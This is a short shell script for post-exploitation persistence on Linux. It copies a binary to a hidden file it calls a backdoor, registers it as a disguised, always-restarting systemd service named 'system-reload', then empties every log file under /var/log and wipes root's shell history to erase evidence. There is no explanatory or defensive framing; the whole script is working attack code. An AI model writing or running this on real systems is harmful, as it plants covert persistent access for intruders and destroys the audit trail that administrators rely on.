#!/bin/sh
SERVICE="system-reload"
PATH="/usr/local/bin"
FILE=".init"
BACKDOOR="$PATH/$FILE"

cp run $BACKDOOR
/usr/bin/chmod 711 $BACKDOOR

/usr/bin/cat <<EOF > /lib/systemd/system/$SERVICE.service
[Unit]
Description=Reload Mode
Documentation=man:systemd.special(7)
After=network.target
[Service]
RestartSec=30s
Restart=always
TimeoutStartSec=5
ExecStart=$BACKDOOR
[Install]
WantedBy=multi-user.target
EOF

/usr/bin/systemctl daemon-reload && /usr/bin/systemctl enable $SERVICE && /usr/bin/systemctl start $SERVICE

for logs in `find /var/log -type f`; do cat /dev/null > $logs; done

/usr/bin/cat /dev/null > /root/.bash_history && history -c && history -w
